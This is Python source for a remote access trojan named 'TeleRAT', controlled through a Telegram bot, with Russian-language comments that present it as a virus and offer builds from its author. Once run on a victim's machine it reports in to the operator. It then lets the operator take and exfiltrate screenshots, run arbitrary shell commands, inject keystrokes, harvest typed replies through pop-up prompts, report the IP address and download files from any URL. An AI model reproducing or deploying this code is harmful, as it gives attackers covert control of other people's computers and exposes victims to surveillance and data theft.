import telebot
from telebot import types
import requests
import pyautogui as pg
import platform as pf
import os
import time

TOKEN = ''

CHAT_ID = ''

client = telebot.TeleBot(TOKEN)

requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Юзер онлайн! Введите /help для справки!")

@client.message_handler(commands=["start"])
def startmsg(message):
	client.send_message(message.chat.id, "Добро пожаловать в TeleRAT, Если ты видишь это сообщение то юзер онлайн, потому-что сам бот храниться в вирусе как и токен! Чтобы получить билд обращайтесь в телеграм @thecoffee_cup\nДанная крыска написанна ToxidWorm (aka ReClean Bfresher)\nВведите /help для справки!")

@client.message_handler(commands=["help"])
def helpmsg(message):
	client.send_message(message.chat.id, "Вот список команд которые тебе нужны для управления:\n/screenshot - Сделать снимок экрана\n/message - Отправить сообщение на экран\n/info - Информация про пк\n/type - Печать определённого текста на клавиатуре\n/command - Выполнить команду в командной строке\n/getip - Получить IP Адресс\n/input - Отправка сообщения с ответом от пользователя\n/download - Скачать файл по прямой ссылке\nОригинальный RAT написан ToxidWorm aka ReClean Bfresher\nУдачи с данной 'крыской'")

@client.message_handler(commands=["screenshot"])
def grabscreen(message):
	pg.screenshot("screenshot.png")
	with open("screenshot.png", "rb") as img:
   		client.send_photo(message.chat.id, img)

@client.message_handler(commands=["message"])
def sendtextmsg(message):
	msg = client.send_message(message.chat.id, 'Введите сообщение чтобы вывести на экран:')
	client.register_next_step_handler(msg, sendmsg)

def sendmsg(message):
    pg.alert(message.text, '')

@client.message_handler(commands=["info"])
def getpcinfo(message):
	client.send_message(message.chat.id, f"Имя компьютера: {pf.node()}\nСистема: {pf.system()} {pf.release()}")

@client.message_handler(commands=["type"])
def getkeyboardinstructions(message):
	msg = client.send_message(message.chat.id, 'Введите то что нужно напечатать на клавиатуре:')
	client.register_next_step_handler(msg, typeonkeyboard)

def typeonkeyboard(message):
	pg.write(message.text, 0.1)

@client.message_handler(commands=["command"])
def getcommands(message):
	msg = client.send_message(message.chat.id, 'Введите то что нужно выполнить в командной строке:')
	client.register_next_step_handler(msg, executecommands)

def executecommands(message):
	os.system(message.text);

@client.message_handler(commands=["getip"])
def getcommands(message):
	response = requests.get("http://jsonip.com/").json()
	client.send_message(message.chat.id, f"IP Адресс: {response['ip']}")

@client.message_handler(commands=["input"])
def inputinstructions(message):
	msg = client.send_message(message.chat.id, 'Введите сообщение чтобы вывести на экран:')
	client.register_next_step_handler(msg, inputsend)

def inputsend(message):
	inputanswer = pg.prompt(message.text, '')
	client.send_message(message.chat.id, 'Ответ от пользователя:\n' + inputanswer)

@client.message_handler(commands=["download"])
def downloadfileinstructions(message):
	msg = client.send_message(message.chat.id, 'Введите ссылку на скачивание (прямую):')
	client.register_next_step_handler(msg, downloadfile)

def downloadfile(message):
	try:
		url = message.text
		filename = url.split('/')[-1]
		r = requests.get(url, allow_redirects=True)
		open(filename, 'wb').write(r.content)
	except:
		client.send_message(message.chat.id, 'Не удалось скачать файл!')

client.polling()